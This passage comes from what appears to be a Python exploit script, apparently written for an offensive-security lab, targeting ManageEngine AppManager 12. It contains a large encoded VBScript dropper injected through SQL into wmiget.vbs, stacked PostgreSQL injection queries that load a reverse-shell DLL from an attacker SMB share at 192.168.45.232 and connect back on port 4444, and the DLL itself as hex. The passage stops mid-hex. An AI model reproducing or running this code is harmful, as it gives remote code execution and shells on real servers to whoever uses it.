74%73%65%45%31%56%63%56%5a%50%4d%46%4a%4e%4d%6d%31%6d%52%30%70%4d%57%53%74%56%55%30%64%42%54%33%6c%52%61%30%46%55%5a%54%6c%4f%61%48%56%76%5a%47%67%76%5a%7a%52%69%62%56%64%42%61%6b%67%7a%53%56%52%45%52%48%5a%73%59%7a%42%69%62%31%6c%74%63%69%73%72%64%57%74%6a%56%6a%64%4c%51%57%59%7a%55%55%5a%48%57%57%74%5a%61%69%73%79%61%6c%46%47%59%55%4a%55%5a%6c%56%4c%54%6e%4e%79%65%47%6c%4a%5a%45%31%4d%51%6d%74%31%63%32%6c%71%54%69%74%75%4f%57%56%35%64%7a%5a%70%61%6a%68%46%59%56%42%53%4d%54%4d%34%64%31%52%4c%53%57%4e%4a%63%54%68%43%56%33%5a%74%52%48%4a%5a%57%47%68%43%4b%7a%56%6f%53%46%4a%6e%4d%43%73%32%4d%31%68%52%62%6d%77%32%5a%55%52%54%4d%47%5a%56%64%46%4a%6d%63%6b%39%33%59%55%35%46%63%33%70%54%52%48%41%31%59%53%39%34%55%33%42%59%5a%6b%5a%4a%64%6a%5a%33%4f%47%51%78%63%6a%46%58%54%57%68%70%52%32%46%61%65%45%78%48%4e%6e%41%31%65%57%64%32%61%32%70%69%4e%6c%6c%48%64%44%56%43%4e%6d%77%32%63%57%4a%69%5a%45%4e%35%57%45%64%75%62%55%64%36%54%31%4a%5a%59%32%70%54%57%58%42%77%57%56%70%6e%63%6d%5a%58%5a%44%4a%36%64%33%63%30%51%32%4a%44%61%7a%56%50%4e%6a%5a%61%65%46%56%5a%4f%55%31%43%4c%30%64%4e%63%57%39%50%51%53%39%6f%59%31%4e%6b%4b%31%4e%4d%61%48%46%73%55%6a%46%4c%53%69%39%77%56%58%52%47%55%48%6c%6a%4e%30%6c%35%4d%45%68%59%64%44%42%31%57%6a%4e%33%4d%55%51%72%51%54%56%79%56%6c%52%6c%54%6e%45%33%55%55%64%53%5a%6c%4a%43%4e%55%39%79%56%55%52%4c%54%45%70%79%65%6b%70%56%62%6d%46%78%56%7a%5a%42%57%45%46%72%61%32%46%33%54%6c%5a%57%4d%46%6c%43%56%48%68%74%62%57%74%59%4e%54%4a%6e%4d%6d%56%47%4f%45%68%4d%4f%55%49%30%52%6d%63%34%65%6b%4a%72%57%55%38%72%65%6d%68%4d%54%57%4a%69%56%6c%4a%4b%65%6d%4a%74%59%32%68%50%54%47%5a%6d%64%48%45%31%56%6d%34%72%64%6e%6c%55%54%58%41%33%51%55%4e%46%5a%57%6c%50%64%33%64%44%64%45%39%4a%51%6d%68%54%64%6b%78%74%65%55%4a%6a%65%6b%70%44%56%48%6b%31%64%31%6c%47%63%56%68%50%62%57%51%7a%4b%32%68%77%64%6c%56%52%59%55%4e%44%64%45%78%5a%62%6b%4a%72%63%6d%56%36%4d%30%46%33%59%6b%64%43%59%30%6b%35%4e%48%55%35%65%57%34%32%63%44%56%68%56%31%6c%53%61%6c%70%4a%64%6d%70%52%4e%45%35%48%55%33%6c%30%51%33%5a%53%65%54%45%31%55%45%46%78%52%6c%68%47%65%6c%70%58%56%30%68%79%63%6d%64%7a%4d%6e%4a%70%4d%32%6c%46%51%55%73%78%55%30%39%4c%4e%45%64%76%59%6d%70%31%59%32%70%68%62%45%56%74%4d%47%68%51%52%33%52%72%62%6d%78%44%51%57%78%55%65%47%78%6f%4d%6b%67%33%62%6a%5a%42%65%45%6c%4b%64%6d%5a%79%56%6c%4d%77%5a%57%35%55%4d%6b%4a%4d%4d%54%4a%31%61%47%46%32%4f%56%56%5a%62%6a%64%4a%52%7a%51%33%5a%58%4e%71%65%6d%4e%4d%52%57%52%70%53%54%52%49%53%6b%56%35%62%45%78%43%65%57%78%55%4c%33%5a%78%61%30%74%7a%4c%32%56%58%52%56%52%76%56%6d%67%32%4d%6d%68%48%51%31%52%70%4d%48%5a%54%4d%46%56%68%4b%32%52%36%5a%44%42%5a%65%6d%39%49%55%55%31%49%55%6c%46%42%64%55%4e%6f%53%31%51%7a%63%30%64%36%59%31%5a%55%53%6a%64%77%63%6a%64%49%52%45%34%35%65%55%38%72%54%32%31%56%56%6b%31%43%55%6d%56%78%54%57%68%55%61%48%70%55%63%6d%35%4a%63%31%64%48%54%48%6b%77%57%6d%52%78%61%57%64%49%63%45%46%57%4c%31%64%71%64%32%45%34%53%7a%4a%6e%4e%6c%64%6e%53%56%46%31%4f%45%39%42%54%44%4e%70%52%45%39%4b%63%45%63%72%4e%7a%49%31%4e%6d%6c%6f%5a%6d%78%61%57%58%4e%76%63%44%64%69%56%32%46%42%59%6b%68%51%4d%54%5a%49%64%57%63%77%56%7a%4a%4c%53%32%67%33%5a%31%6c%7a%63%6c%64%42%4d%57%51%30%4f%58%42%46%57%6b%45%30%4b%7a%42%54%55%7a%42%54%61%47%78%46%63%31%6c%6b%53%47%67%79%57%45%5a%57%65%48%4e%4a%52%46%6c%61%61%6c%68%32%5a%32%78%33%54%6b%74%79%61%33%64%47%52%45%78%69%55%31%42%4f%61%33%5a%68%55%47%55%79%4e%47%4d%76%4f%45%77%35%65%56%46%6f%61%32%68%77%59%6a%5a%4e%52%6b%67%77%5a%7a%4e%7a%62%30%31%5a%57%43%38%77%54%30%30%33%64%6b%68%34%65%6e%5a%48%4c%30%4e%53%4f%57%31%6c%64%6e%68%69%63%32%64%34%65%58%70%48%56%56%4e%68%4d%46%70%71%4d%46%70%36%4e%45%68%56%63%6d%5a%52%51%6b%45%30%61%47%4d%35%63%45%56%4c%52%47%6c%35%4e%6d%46%46%4e%33%5a%6c%63%48%46%76%55%32%4e%4e%53%55%6b%72%5a%69%74%42%55%7a%51%76%56%57%39%34%4e%6c%59%78%53%48%6c%71%4f%44%46%73%65%6e%42%33%4e%6e%6c%46%56%47%68%55%53%69%73%7a%56%44%4e%77%51%6c%46%7a%4c%7a%49%32%4b%31%6c%45%4d%32%39%50%5a%6b%56%59%4e%32%68%44%4e%45%56%34%64%6c%52%6e%53%54%56%33%64%33%70%32%56%6d%56%79%4e%44%5a%4a%56%58%52%4b%62%46%4a%47%57%6b%4e%44%55%6b%35%4a%52%6b%73%34%53%7a%52%57%61%46%6c%57%59%58%46%76%4e%6d%49%34%56%43%39%35%51%32%4a%4b%55%6b%74%4f%57%47%30%31%51%6c%64%6a%63%32%77%78%57%58%63%35%4b%30%73%34%64%57%70%6b%4d%46%64%4d%57%6e%4a%76%63%54%42%6a%53%6e%70%33%4d%47%64%33%4f%46%4e%48%5a%31%42%56%52%6c%5a%73%56%6d%78%45%4d%48%6f%79%4d%30%4d%31%5a%44%56%6c%64%30%52%36%62%30%68%6e%62%6a%6c%44%62%47%78%53%51%7a%6c%78%56%46%67%33%57%6d%52%6a%63%45%64%61%5a%46%4d%32%4f%57%4e%4e%4e%55%39%7a%4f%47%6f%35%51%33%4a%56%52%54%52%75%62%53%74%48%4e%45%6f%35%51%55%6c%77%4e%53%38%79%61%6d%68%31%4d%30%68%70%4e%54%42%46%59%6b%56%53%62%30%68%52%54%6d%6c%4f%63%6b%64%6f%4d%7a%41%33%57%46%4a%6a%51%6e%6c%30%4b%33%68%55%61%32%49%78%4e%58%70%53%5a%32%4a%6c%4d%6a%68%79%65%56%51%34%4f%47%74%31%63%33%6c%44%63%54%46%35%63%53%73%31%54%7a%56%76%54%55%46%58%51%6d%56%5a%65%57%46%6b%61%45%49%33%4e%56%68%54%56%6b%4e%42%62%6a%51%76%5a%45%56%59%4e%6a%4e%46%52%55%64%78%4e%7a%56%51%4d%56%59%30%5a%6d%46%45%61%6d%78%75%64%56%42%59%53%79%39%7a%52%47%78%58%56%30%6f%78%59%54%4d%76%51%6a%64%35%53%6e%4d%30%52%45%68%69%56%33%70%50%5a%45%64%49%61%32%6c%57%61%79%38%79%62%33%67%30%5a%58%4e%47%65%47%64%77%4d%6c%52%5a%55%6e%52%4f%4d%43%74%6a%65%54%49%7a%54%30%68%75%55%33%6c%59%5a%32%5a%54%51%31%52%68%64%46%56%74%4c%7a%6c%47%4f%47%55%76%53%6e%55%79%53%32%39%75%56%31%4e%61%54%55%52%4d%52%31%46%48%53%53%39%76%4d%7a%52%6a%4d%47%35%77%4f%46%52%4a%52%55%59%34%64%58%68%54%64%31%4e%58%64%44%4e%76%62%31%52%4d%57%45%64%6d%5a%44%64%6a%64%30%78%45%53%30%68%53%52%55%74%77%64%45%39%34%5a%6a%64%50%4b%33%46%32%4f%57%77%32%4d%48%49%35%4c%7a%6c%74%4e%30%70%55%64%47%67%32%51%30%55%77%52%47%45%76%63%55%52%72%52%47%59%78%56%6d%6c%61%4f%47%70%35%5a%48%52%49%54%32%64%54%54%44%6c%34%4d%58%4a%6e%64%79%74%47%55%53%74%79%61%6a%59%34%62%31%46%4d%54%6c%4d%76%53%31%56%49%62%55%5a%44%5a%55%30%77%51%31%70%77%64%31%68%71%59%32%30%33%64%58%41%32%56%44%68%34%53%7a%64%6a%51%69%39%71%64%30%68%68%56%30%35%6a%64%31%42%4e%65%47%46%74%57%6e%46%30%64%55%6c%56%51%33%70%79%56%32%6c%31%51%30%70%47%64%6c%46%52%56%44%5a%68%65%6d%4a%54%4b%33%4a%78%4f%55%30%72%64%6b%56%36%63%48%63%30%65%6a%42%71%65%48%63%7a%62%30%4a%59%4e%45%52%55%61%30%63%31%53%7a%68%31%52%47%64%48%55%58%42%55%57%6d%63%33%57%6b%6c%33%4f%58%56%6e%52%47%56%43%5a%6d%56%34%57%6c%64%55%52%45%4a%30%53%55%4e%31%4e%6d%52%58%63%6c%4e%71%59%6c%55%32%55%48%52%47%4d%6e%42%6b%54%46%6c%78%55%53%74%53%61%55%35%4d%52%32%59%31%5a%45%52%4f%5a%6e%6c%71%5a%56%64%52%52%47%68%74%59%57%74%31%53%45%6f%33%64%45%4a%32%62%6b%49%79%63%6c%4e%46%51%32%6b%7a%59%53%38%77%5a%6b%64%51%64%32%35%75%56%32%35%4d%62%30%4e%49%56%32%55%76%61%6a%4a%55%5a%6e%45%31%55%6c%41%77%59%56%4e%36%61%48%5a%48%57%48%4a%68%55%46%55%72%5a%6b%78%5a%57%55%52%4b%59%58%59%79%53%30%6c%55%59%6b%52%5a%56%57%4d%77%52%54%6c%50%51%6a%46%75%4e%6c%5a%69%61%56%46%69%55%32%64%35%63%47%31%72%61%6a%55%79%59%31%56%58%51%31%4a%36%59%6d%5a%52%4e%58%42%34%53%58%4e%72%62%6c%46%4b%56%48%4a%47%65%58%64%36%62%6d%64%54%56%45%39%4a%56%46%56%4a%51%58%6c%49%59%30%4a%71%52%6b%39%44%51%6d%4e%4c%62%54%51%35%4d%45%34%79%4b%32%6c%51%64%31%46%4b%53%6a%4d%35%53%46%52%71%53%6c%4a%5a%62%6c%42%70%51%6a%5a%32%53%32%78%32%64%55%52%6c%55%44%42%72%4e%6a%52%77%55%31%68%72%57%6d%46%71%4f%45%52%51%65%53%74%75%5a%7a%4e%43%4e%57%4e%6a%51%58%6c%58%4e%57%4e%35%62%6d%78%58%54%6e%52%70%55%57%31%4b%59%30%51%78%52%57%34%34%62%57%5a%6c%57%47%4e%4d%4d%45%35%72%61%7a%68%42%53%45%39%43%61%30%4a%61%4c%32%5a%69%54%33%4a%33%62%32%38%72%65%6d%4d%34%54%47%64%7a%53%58%46%42%63%7a%59%77%65%6d%78%78%52%56%5a%4d%51%58%52%52%4f%57%4e%36%51%7a%63%32%56%55%64%45%65%6e%70%42%4c%31%63%79%52%6c%68%4d%53%45%78%79%4d%55%70%7a%63%7a%52%75%54%33%46%36%61%6a%6c%76%59%6d%68%31%57%6a%64%6c%65%48%4e%5a%61%6c%6f%33%57%6b%68%69%4b%30%73%31%64%58%6c%33%51%58%64%44%5a%45%77%33%61%6c%6c%51%54%47%78%43%57%56%56%30%65%6c%6c%73%53%57%49%31%5a%56%45%30%5a%46%6c%42%65%47%35%4b%57%44%5a%4c%62%57%5a%59%63%32%46%54%5a%32%64%4a%4e%6a%68%4b%62%6e%4a%4b%4d%58%51%79%57%6e%4e%54%56%48%42%4b%55%45%39%69%62%47%64%5a%4d%47%70%46%64%6a%46%54%56%6b%4a%58%4e%31%45%34%55%46%70%47%61%58%4e%50%64%6d%4a%32%56%79%39%6a%51%30%4d%33%65%46%70%42%62%47%49%31%5a%44%6b%78%4f%54%5a%6e%62%45%46%36%57%6b%46%76%62%6d%39%44%55%32%5a%33%62%6b%52%52%54%55%5a%4c%52%30%5a%32%4c%7a%63%35%63%6b%68%7a%64%46%63%72%61%57%4a%76%4b%31%5a%34%63%30%63%77%54%45%67%33%62%30%49%31%4d%47%4e%58%57%55%4e%34%63%31%42%4e%56%48%6b%34%54%6b%59%35%64%44%52%44%4e%6d%5a%7a%64%33%42%49%62%6d%59%32%61%44%6c%34%54%6a%5a%56%65%45%4e%72%57%45%35%7a%64%6c%49%33%4d%30%35%53%63%6e%70%6f%4d%57%68%75%53%58%64%4b%4d%6e%70%70%65%6d%31%53%64%6e%55%72%51%6c%46%44%63%47%74%54%54%6e%51%72%5a%6a%52%34%51%6b%34%32%4d%55%74%44%62%6e%46%5a%53%57%64%4b%64%48%6c%50%4e%6d%63%76%64%6e%68%55%62%47%56%35%56%32%35%77%62%31%42%6b%4c%30%39%35%4c%31%56%68%4e%44%68%4d%4f%48%4e%6a%55%57%4a%59%59%6b%31%33%53%45%67%35%55%6b%6b%31%4e%47%70%7a%53%58%46%6b%64%58%55%78%51%31%52%78%65%44%5a%7a%53%55%4a%48%5a%6b%74%73%4d%56%46%7a%64%32%6c%47%65%6c%70%30%65%54%49%7a%52%6d%39%44%57%6b%6c%79%4f%55%70%74%61%46%5a%44%63%47%68%35%57%54%6c%5a%4c%30%4a%45%57%55%45%30%65%6c%4e%43%56%33%51%32%53%58%49%79%4d%55%6c%44%51%6b%6c%30%59%58%46%61%59%6a%46%6e%54%6c%45%77%55%30%68%5a%4d%6c%64%4c%54%57%4a%50%4d%55%35%61%64%6a%52%59%53%44%64%59%53%56%64%31%56%45%6c%4d%55%48%42%36%57%45%73%30%4d%55%6b%35%64%47%38%35%4d%56%42%6a%4b%31%67%35%62%33%64%53%57%54%4a%33%53%6b%45%32%56%6d%64%58%55%45%4e%71%53%6d%4d%72%62%56%70%58%53%6a%5a%36%55%55%70%48%51%6c%56%72%57%6d%5a%6a%63%32%49%35%63%45%74%6c%61%6b%78%4a%56%6d%5a%71%59%54%64%70%55%44%68%36%62%7a%68%6e%53%32%46%58%55%6d%68%32%54%6e%5a%44%64%46%46%43%63%31%70%4b%61%31%67%34%57%45%59%35%54%6d%64%59%55%31%5a%46%59%6b%52%76%53%31%5a%71%4d%55%4e%5a%4e%56%51%7a%5a%57%70%7a%54%6c%6c%79%61%46%63%72%65%56%52%6a%62%54%67%34%64%6e%4e%4e%54%31%68%44%55%45%31%78%4d%6c%5a%54%54%54%42%6e%5a%54%4e%4a%4d%57%64%53%54%32%39%47%5a%45%56%71%4e%57%5a%58%61%7a%5a%52%54%6b%74%36%64%47%70%76%56%6d%46%5a%61%48%46%77%62%54%56%32%51%6a%51%33%62%55%6c%50%63%32%4a%48%64%55%4e%58%53%6a%4a%43%56%44%5a%30%5a%48%46%32%55%6d%56%50%57%6d%56%33%65%48%4a%45%61%6a%56%4c%61%6d%56%32%54%47%78%72%54%48%56%4f%52%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%33%64%33%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%5a%52%64%30%46%42%51%54%52%4e%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%52%52%45%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%55%55%52%42%51%55%46%42%51%55%46%42%51%55%4e%6a%51%55%56%57%4e%47%46%59%55%6c%46%6a%62%54%6c%71%57%6c%68%4f%65%6b%46%42%51%55%46%42%52%45%46%42%51%55%56%30%52%6c%56%72%4e%55%5a%55%52%45%31%35%54%47%31%53%63%32%4a%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%46%42%51%55%45%72%5a%30%4a%4d%4f%57%74%42%4e%30%64%6c%53%6e%6c%69%62%6d%4e%52%55%6e%6c%4a%56%31%64%75%4c%31%64%72%5a%57%64%30%56%57%63%72%59%6d%38%30%64%32%45%76%61%55%59%31%61%32%78%48%55%31%52%36%61%6d%4a%55%53%45%68%31%63%6b%68%52%4b%7a%56%75%61%56%52%6b%54%54%42%70%53%6b%5a%69%55%53%49%36%52%47%6c%74%49%47%52%5a%57%45%31%71%63%47%39%71%56%48%52%56%5a%56%68%30%62%54%70%54%5a%58%51%67%5a%46%6c%59%54%57%70%77%62%32%70%55%64%46%56%6c%57%48%52%74%49%44%30%67%51%33%4a%6c%59%58%52%6c%54%32%4a%71%5a%57%4e%30%4b%43%4a%54%59%33%4a%70%63%48%52%70%62%6d%63%75%52%6d%6c%73%5a%56%4e%35%63%33%52%6c%62%55%39%69%61%6d%56%6a%64%43%49%70%4f%6b%52%70%62%53%42%6a%61%55%74%47%62%47%68%44%5a%45%56%6c%51%6d%5a%71%65%54%70%45%61%57%30%67%64%32%64%59%5a%58%70%4f%64%6b%68%72%52%31%64%72%56%44%70%54%5a%58%51%67%59%32%6c%4c%52%6d%78%6f%51%32%52%46%5a%55%4a%6d%61%6e%6b%67%50%53%42%6b%57%56%68%4e%61%6e%42%76%61%6c%52%30%56%57%56%59%64%47%30%75%52%32%56%30%55%33%42%6c%59%32%6c%68%62%45%5a%76%62%47%52%6c%63%69%67%79%4b%54%70%33%5a%31%68%6c%65%6b%35%32%53%47%74%48%56%32%74%55%49%44%30%67%59%32%6c%4c%52%6d%78%6f%51%32%52%46%5a%55%4a%6d%61%6e%6b%67%4a%69%41%69%58%43%49%67%4a%69%42%6b%57%56%68%4e%61%6e%42%76%61%6c%52%30%56%57%56%59%64%47%30%75%52%32%56%30%56%47%56%74%63%45%35%68%62%57%55%6f%4b%54%70%6b%57%56%68%4e%61%6e%42%76%61%6c%52%30%56%57%56%59%64%47%30%75%51%33%4a%6c%59%58%52%6c%52%6d%39%73%5a%47%56%79%4b%48%64%6e%57%47%56%36%54%6e%5a%49%61%30%64%58%61%31%51%70%4f%6d%64%6c%64%31%52%5a%64%58%68%6b%49%44%30%67%64%32%64%59%5a%58%70%4f%64%6b%68%72%52%31%64%72%56%43%41%6d%49%43%4a%63%49%69%41%6d%49%43%4a%50%56%56%70%5a%59%6b%5a%6f%63%46%52%76%51%55%6c%73%55%6b%4d%75%5a%58%68%6c%49%6a%70%45%61%57%30%67%59%6b%6c%68%59%33%68%72%53%32%31%6e%65%44%70%54%5a%58%51%67%59%6b%6c%68%59%33%68%72%53%32%31%6e%65%43%41%39%49%45%4e%79%5a%57%46%30%5a%55%39%69%61%6d%56%6a%64%43%67%69%56%33%4e%6a%63%6d%6c%77%64%43%35%54%61%47%56%73%62%43%49%70%4f%6b%70%4d%5a%45%35%78%52%47%52%69%53%45%45%67%50%53%42%72%5a%58%64%4b%61%6c%64%31%64%43%68%76%56%48%42%46%52%46%5a%34%61%6d%6f%70%4f%6c%4e%6c%64%43%42%4c%5a%45%70%33%55%55%35%54%54%30%4e%4b%65%6d%46%59%51%6e%59%67%50%53%42%44%63%6d%56%68%64%47%56%50%59%6d%70%6c%59%33%51%6f%49%6b%46%45%54%30%52%43%4c%6c%4e%30%63%6d%56%68%62%53%49%70%4f%6b%74%6b%53%6e%64%52%54%6c%4e%50%51%30%70%36%59%56%68%43%64%69%35%55%65%58%42%6c%49%44%30%67%4d%54%70%4c%5a%45%70%33%55%55%35%54%54%30%4e%4b%65%6d%46%59%51%6e%59%75%54%33%42%6c%62%6a%70%4c%5a%45%70%33%55%55%35%54%54%30%4e%4b%65%6d%46%59%51%6e%59%75%56%33%4a%70%64%47%55%67%53%6b%78%6b%54%6e%46%45%5a%47%4a%49%51%54%70%4c%5a%45%70%33%55%55%35%54%54%30%4e%4b%65%6d%46%59%51%6e%59%75%55%32%46%32%5a%56%52%76%52%6d%6c%73%5a%53%42%6e%5a%58%64%55%57%58%56%34%5a%43%77%67%4d%6a%70%69%53%57%46%6a%65%47%74%4c%62%57%64%34%4c%6e%4a%31%62%69%42%6e%5a%58%64%55%57%58%56%34%5a%43%77%67%4d%43%77%67%64%48%4a%31%5a%54%70%6b%57%56%68%4e%61%6e%42%76%61%6c%52%30%56%57%56%59%64%47%30%75%52%47%56%73%5a%58%52%6c%52%6d%6c%73%5a%53%68%6e%5a%58%64%55%57%58%56%34%5a%43%6b%36%5a%46%6c%59%54%57%70%77%62%32%70%55%64%46%56%6c%57%48%52%74%4c%6b%52%6c%62%47%56%30%5a%55%5a%76%62%47%52%6c%63%69%68%33%5a%31%68%6c%65%6b%35%32%53%47%74%48%56%32%74%55%4b%54%70%46%62%6d%51%67%52%6e%56%75%59%33%52%70%62%32%34%36%52%55%39%43%62%32%78%73%51%6c%46%30%4f%6c%64%54%59%33%4a%70%63%48%51%75%55%58%56%70%64%43%67%77%4b%51%3d%3d$$,$$base64$$),$$utf-8$$))+to+$$C:\\Program+Files+(x86)\\ManageEngine\\AppManager12\\working\\conf\\application\\scripts\\wmiget.vbs$$;"
    data = "ForMasRange=1&userId=" + query
    headers={'Content-Type': 'application/x-www-form-urlencoded'}
    r = requests.post(url, headers=headers, data=data, verify=False, proxies=proxies)
    print("[+] Updated wmiget.vbs, wait and see if you can capture a reverse shell.")
    print("[+] Remember to run the following command for reverse shell listener")
    print("nc -nvlp 4444")

def udf_reverse_shell(ip):
    print("[+] Creating UDF for reverse shell...")
    query = "1; CREATE OR REPLACE FUNCTION connect_back(text, integer) RETURNS void AS '\\\\192.168.45.232\\awae\\rev_shell.dll', 'connect_back' LANGUAGE C STRICT;--+"
    make_request(ip, query)

    print("[+] Triggering the reverse shell...")
    query = "1; SELECT connect_back('192.168.45.232', 4444);--+"
    make_request(ip, query)

def copy_udf_reverse_shell(ip):
    # xxd rev_shell.dll| cut -d" " -f 2-9 | sed 's/ //g' | tr -d '\n' > rev_shell.dll.txt
    udf = '4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000080100000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a240000000000000095a3f5b7d1c29be4d1c29be4d1c29be4d8ba08e4d3c29be408a09ae5d3c29be408a098e5d0c29be408a09ee5dbc29be408a09fe5dac29be4a2a09ae5d5c29be4beb407e4d2c29be4d1c29ae4f7c29be41aa193e5d0c29be41aa19be5d0c29be41aa199e5d0c29be452696368d1c29be4000000000000000000000000000000000000000000000000504500004c0104003ccea5660000000000000000e00002210b010e0b000e00000012000000000000181400000010000000200000000000100010000000020000060000000000000006000000000000000050000000040000000000000200400100001000001000000000100000100000000000001000000010250000800000009025000078000000000000000000000000000000000000000000000000000000004000005c01000000210000700000000000000000000000000000000000000000000000000000007021000040000000000000000000000000200000940000000000000000000000000000000000000000000000000000002e746578740000005c0d000000100000000e000000040000000000000000000000000000200000602e726461746100006c09000000200000000a000000120000000000000000000000000000400000402e64617461000000c00500000030000000020000001c0000000000000000000000000000400000c02e72656c6f6300005c0100000040000000020000001e00000000000000000000000000004000004200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b8d8200010c3ccccccccccccccccccccb8d4200010c3cccccccccccccccccccc558bec5668203400106802020000ff15542000106a006a006a006a066a016a02ff15582000108b7508a3b0330010b80200000066a3a03300100fb7461850ff154820001066a3a2330010ff7614ff158c200010506a00ff3588200010ff158420001083c41050ff15502000106a006a006a006a006a1068a0330010ff35b0330010a3a4330010ff154c2000106a446a0068c0330010e85a0c0000a1b033001083c40cc705c033001044000000c705ec33001001010000a30034001068b035001068c03300106a006a006a006a016a006a0068cc2000106a00a3fc330010a3f8330010ff150820001033c05e5dc33b0d00300010f27502f2c3f2e945030000558bec8b450c83e800743383e801742083e80